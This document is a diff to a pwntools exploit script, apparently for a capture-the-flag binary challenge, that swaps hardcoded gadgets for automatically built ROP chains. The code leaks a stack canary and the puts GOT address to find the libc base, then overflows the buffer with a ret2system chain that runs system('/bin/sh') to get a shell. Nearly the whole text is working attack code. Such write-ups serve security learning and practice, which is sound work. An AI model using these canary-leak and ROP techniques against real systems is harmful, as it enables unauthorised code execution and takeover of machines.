@@ -39,8 +39,10 @@ offset = 88  # Canary offset
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-2.27.so")
 
-pop_rdi = 0x400d43  # Found with ropper
-ret = 0x400606  # Stack alignment
+# Create ROP object from challenge binary
+rop = ROP(elf)
+
+ret = rop.find_gadget(['ret'])[0]  # Stack alignment
 
 # Leak values from the stack - The c56500c7ab26a5100d4672cf18835690 value found from static analysis/debugging
 io.sendlineafter(
@@ -55,16 +57,19 @@ leaked_addresses = io.recvS().split(" ")
 canary = int(leaked_addresses[-9:-8][0][:18], 16)
 info('canary = 0x%x (%d)', canary, canary)
 
+rop.puts(elf.got.puts)  # Leak got.puts
+rop.restart()  # Return for 2nd payload
+
+# Print ROP gadgets and ROP chain
+# pprint(rop.gadgets)
+# pprint(rop.dump())
+
 # Build payload (leak puts)
 payload = flat([
     offset * b'A',  # Pad to canary (88)
     canary,  # Our leaked canary (8)
     8 * b'A',  # Pad to Ret pointer (8)
-    # Leak got.puts
-    pop_rdi,
-    elf.got.puts,
-    elf.plt.puts,
-    elf.symbols.restart  # Return for 2nd payload
+    rop.chain()  # ROP chain
 ])
 
 # Send the payload
@@ -77,16 +82,21 @@ info("leaked got_puts: %#x", got_puts)
 libc.address = got_puts - libc.symbols.puts
 info("libc_base: %#x", libc.address)
 
+# Create ROP object from Lib-C
+rop = ROP(libc)
+rop.system(next(libc.search(b'/bin/sh\x00')))  # system('/bin/sh')
+
+# Print ROP gadgets and ROP chain
+# pprint(rop.gadgets)
+# pprint(rop.dump())
+
 # Build payload (ret2system)
 payload = flat([
     offset * b'A',  # Pad to canary (88)
     canary,  # Our leaked canary (8)
     8 * b'A',  # Pad to Ret pointer (8)
-    # Ret2system
-    pop_rdi,
-    next(libc.search(b'/bin/sh\x00')),
     ret,  # Stack alignment
-    libc.symbols.system
+    rop.chain()  # ROP chain
 ])
 
 # Send the payload
